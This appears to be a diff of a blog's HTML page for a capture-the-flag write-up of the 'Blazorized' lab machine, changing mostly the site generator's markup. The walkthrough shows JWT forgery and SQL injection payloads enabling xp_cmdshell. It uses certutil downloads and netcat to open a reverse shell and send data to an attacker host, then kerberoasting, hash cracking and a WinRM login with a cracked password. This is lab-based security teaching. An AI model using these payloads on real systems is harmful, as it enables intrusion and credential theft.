@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.9.0.802684146396">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807375038140">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.9.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Blazorized (Hard)</title>
@@ -32,43 +32,43 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.9.0.802684146396" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.807375038140" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.9.0.802684146396" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.9.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.9.0.802684146396" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.9.0.802684146396" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.807375038140" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
-                        </a><span class="hidden mt-1 px-2 py-1 ml-4 text-xs font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-md md:inline-block">Blog</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                             </li>
         
                         </ul>
@@ -82,7 +82,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -100,7 +100,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -110,25 +110,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -138,23 +139,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                                     </li>
             
                                 </ul>
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -162,14 +163,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="blazorized-hard" class="break-words">
     <h1>
@@ -187,7 +188,7 @@
 </div>
 
 <p><figure class="content-center">
-    <img src="../../../../assets/images/headers/blazorized.png" alt="" />
+    <img src="../../../../assets/images/headers/blazorized.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -206,7 +207,7 @@
 </doc-anchor-target>
 <p>Starting with an nmap scan, we see that the host is a domain controller and redirects us to <code v-pre>blazorized.htb</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nmap -sCV -oN blazorized.nmap 10.10.11.22
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nmap -sCV -oN blazorized.nmap 10.10.11.22
 Nmap scan report for 10.10.11.22
 Host is up (0.014s latency).
 Not shown: 988 closed tcp ports (conn-refused)
@@ -245,13 +246,13 @@ Host script results:
 </doc-codeblock></div>
 <p>We add the domain to our <code v-pre>/etc/hosts</code> file and continue to enumerate the website. On the website we notice that it is built using <code v-pre>Blazor WebAssembly</code>. One feature of the site is to request all posts and categories from the API at <code v-pre>/check-updates</code>.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/check-updates.png" alt="Check for updates" />
+    <img src="../../../../assets/images/writeups/blazorized/check-updates.png" alt="Check for updates" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">Check for updates</figcaption>
 </figure>
 </p>
 <p>This function makes a request to <code v-pre>api.blazorized.htb</code> so we add this to our host file as well. Intercepting the request in BurpSuite, we see that an authorization token is passed.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/check-updates-api.png" alt="Check for updates API call" />
+    <img src="../../../../assets/images/writeups/blazorized/check-updates-api.png" alt="Check for updates API call" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">Check for updates API call</figcaption>
 </figure>
 </p>
@@ -263,7 +264,7 @@ Host script results:
 </doc-anchor-target>
 <p>We can decode the JWT token with <a href="https://jwt.io/">jwt.io</a>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-json"><code v-pre class="language-json">{
+<pre translate="no" class="language-json"><code v-pre class="language-json">{
   &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;: &quot;superadmin@blazorized.htb&quot;,
   &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;: [
     &quot;Posts_Get_All&quot;,
@@ -276,7 +277,7 @@ Host script results:
 </doc-codeblock></div>
 <p>Another thing to note is that when refreshing the website and intercept our requests, a GET request is made to <code v-pre>/_framework/blazor.boot.json</code>. We can try to extract the <code v-pre>.dll</code> files from the Blazor application by doing a curl command at this endpoint. This will list all loaded dll files by the application.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ curl http://blazorized.htb/_framework/blazor.boot.json
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ curl http://blazorized.htb/_framework/blazor.boot.json
 {
   &quot;cacheBootResources&quot;: true,
   &quot;config&quot;: [ ],
@@ -310,7 +311,7 @@ Host script results:
 </doc-anchor-target>
 <p>After looking at the files one by one and decompiling them using <code v-pre>dnSpy</code> we find something interesting for the <code v-pre>Blazorized.Helpers.dll</code> in the function <code v-pre>JWT</code>.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/blazor-dll-decompile.png" alt="" />
+    <img src="../../../../assets/images/writeups/blazorized/blazor-dll-decompile.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -323,7 +324,7 @@ Host script results:
 </doc-anchor-target>
 <p>With the found JWT secret and admin subdomain, we can generate a new JWT token with the following payload and using the signature we found (make sure to increase the expiration to make the token valid for a longer period).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">{
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
   &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;: &quot;superadmin@blazorized.htb&quot;,
   &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;: [
     &quot;Super_Admin&quot;
@@ -335,13 +336,13 @@ Host script results:
 </doc-codeblock></div>
 <p>There are several ways to forge another JWT token with the secret we just acquired. The easiest method is to again use <a href="https://jwt.io/">jwt.io</a> and inset the secret in the signature field.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/forged-jwt.png" alt="" />
+    <img src="../../../../assets/images/writeups/blazorized/forged-jwt.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Now you can copy the JWT token and import the token into the browser by creating a new item in Local Storage with the key set to <code v-pre>jwt</code> and the token as the value. Then navigate to <code v-pre>http://admin.blazorized.htb</code> and refresh the page to login.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/admin-panel.png" alt="" />
+    <img src="../../../../assets/images/writeups/blazorized/admin-panel.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -353,26 +354,26 @@ Host script results:
 </doc-anchor-target>
 <p>The Super Admin Panel allows managing posts. One feature is looking for duplicate post titles that is vulnerable to blind SQL injection. This can be verified by the following payload:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">' waitfor delay '00:00:05'--</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">' waitfor delay '00:00:05'--</code></pre>
 </doc-codeblock></div>
 <p>This will wait for 5 seconds before executing the query. Now that we have verified that we have an SQL injection, let&#x27;s explore what we can do with this. We can try to upload a Netcat binary onto the host to get a reverse shell with <code v-pre>xp_cmdshell</code>. We first have to enable this transaction in order to use it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -</code></pre>
 </doc-codeblock></div>
 <p>We receive a notification confirming that the command executed without any errors.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/sqli-enable-shell.png" alt="" />
+    <img src="../../../../assets/images/writeups/blazorized/sqli-enable-shell.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Now lets try to get a reverse shell. We start by hosting the <code v-pre>nc.exe</code> binary with a Python webserver, start a netcat listener and then executing the following queries:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">'; EXEC master.dbo.xp_cmdshell 'certutil -f -urlcache http://10.10.14.4:8888/nc.exe %TEMP%\nc.exe'; -- 
+<pre translate="no" class="language-none"><code v-pre class="language-none">'; EXEC master.dbo.xp_cmdshell 'certutil -f -urlcache http://10.10.14.4:8888/nc.exe %TEMP%\nc.exe'; -- 
 '; EXEC master.dbo.xp_cmdshell '%TEMP%\nc.exe 10.10.14.4 4444 -e cmd.exe'; -- </code></pre>
 </doc-codeblock></div>
 <p>After executing the payload we get a shell as <code v-pre>nu_1055</code> and can grab the user flag on their desktop.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nc -nvlp 4444
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nc -nvlp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.10.11.22 50130
 Microsoft Windows [Version 10.0.17763.5936]
@@ -389,7 +390,7 @@ blazorized\nu_1055</code></pre>
 </doc-anchor-target>
 <p>On the machine we see two additional users (<code v-pre>RSA_4810</code> and <code v-pre>SSA_6010</code>).</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users&gt;dir
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">C:\Users&gt;dir
 
  Directory of C:\Users
 
@@ -409,18 +410,18 @@ blazorized\nu_1055</code></pre>
 </doc-anchor-target>
 <p>Since this is a domain controller and we are a domain user, we can run SharpHound to get more information about the users in the domain and what permissions they have.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/SharpHound.exe %TEMP%\SharpHound.exe
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/SharpHound.exe %TEMP%\SharpHound.exe
 C:\Users\NU_1055&gt; %temp%\SharpHound.exe -c All --zipfilename &quot;Bloodhound.zip&quot;</code></pre>
 </doc-codeblock></div>
 <p>We wait for the SharpHound tool to finish and then transfer the ZIP file to our machine.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nc -l -p 4444 &gt; Bloodhound.zip
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nc -l -p 4444 &gt; Bloodhound.zip
 
 C:\Users\NU_1055&gt; %temp%\nc.exe -w 3 10.10.14.4 4444 &lt; 20241109040008_Bloodhound.zip</code></pre>
 </doc-codeblock></div>
 <p>It might be necessary to extract the json files from the ZIP file and converting it to a correct JSON format (using jq). Checking out our results in BloodHound, we see that the user <code v-pre>NU_1055</code> has the ability to write to the &quot;serviceprincipalname&quot; attribute of the user <code v-pre>RSA_4810</code>, therefore we are able to perform a targeted kerberoast attack.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/blazorized/bloodhound-nu.png" alt="" />
+    <img src="../../../../assets/images/writeups/blazorized/bloodhound-nu.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -432,7 +433,7 @@ C:\Users\NU_1055&gt; %temp%\nc.exe -w 3 10.10.14.4 4444 &lt; 20241109040008_Bloo
 </doc-anchor-target>
 <p>We can copy PowerView onto the host and perform the attack from Windows.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
 PS C:\Users\NU_1055&gt; . .\PowerView.ps1
 
 PS C:\Users\NU_1055&gt; Set-DomainObject -Identity 'RSA_4810' -Set @{serviceprincipalname='nonexistent/BLEED'}
@@ -443,7 +444,7 @@ $krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLEED*$D7234985D58C1...&lt;SNIP
 </doc-codeblock></div>
 <p>We get back the <code v-pre>krb5tgs</code> hash of the RSA user and can crack it offline.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 13100 RSA_4810.hash $ROCKYOU</code></pre>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 13100 RSA_4810.hash $ROCKYOU</code></pre>
 </doc-codeblock></div>
 <p>The password of the user is <code v-pre>(Ni7856Do9854Ki05Ng0005 #)</code>.</p>
 <doc-anchor-target id="dacl-abuse">
@@ -454,11 +455,11 @@ $krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLEED*$D7234985D58C1...&lt;SNIP
 </doc-anchor-target>
 <p>We can now login with Evil-WinRM.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'</code></pre>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'</code></pre>
 </doc-codeblock></div>
 <p>We look for ACLs that can be abused using PowerView.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; upload PowerView.ps1
+<pre translate="no" class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; upload PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; . .\PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ObjectAceType, ActiveDirectoryRights | fl
 
@@ -473,14 +474,14 @@ ActiveDirectoryRights : WriteProperty
 </doc-codeblock></div>
 <p>We find one ACL for our current user that shows a WriteProperty on the script path of the <code v-pre>SSA_6010</code> user. By having this permission it could allow us to write a custom logon script that executes whenever this user tries to login to the machine. We can look if this user tried to login:</p>
